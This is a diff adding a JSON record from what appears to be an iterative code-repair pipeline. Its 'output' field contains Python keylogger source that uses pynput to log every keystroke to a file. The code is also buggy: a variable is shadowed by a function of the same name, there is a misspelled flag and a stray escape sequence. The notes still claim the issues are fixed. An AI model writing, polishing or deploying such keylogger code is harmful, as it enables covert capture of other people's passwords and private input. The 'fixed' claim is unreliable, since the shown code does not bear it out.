@@ -1,0 +1,10 @@
+{
+  "output": "import pynput\nfrom pynput import keyboard\nimport os\n\non_press = True\n\ndef on_press(key):\n    global on_press\n    if not on_press:\n        return None\n    one_press=False\n    try:\n        script_dir = os.path.dirname(__file__)\n        log_file = os.path.join(script_dir, 'keylogs.txt')\n        with open(log_file, 'a') as log:\n            if hasattr(key, 'char'):\n                log.write(str(key.char))\n            else:\n                log.write(str(key))\n    except AttributeError:\n        pass\n    finally:\n       one_press=True\n\\nprint('Keylogger Started!')\ndef main():\n   with keyboard.Listener(on_press=on_press) as listener:\n            try:\n                listener.join()\n            except KeyboardInterrupt:\n                pass\nif __name__ == '__main__':  \n    main()",
+  "notes": "Code has been fixed for the issues mentioned. The file now opens in append mode by default which prevents overwrite of keylogs data.",
+  "applied_fixes": [
+    "iteration5_issue1",
+    "iteration6_issue2",
+    "iteration6_issue3"
+  ],
+  "iterations": 6
+}
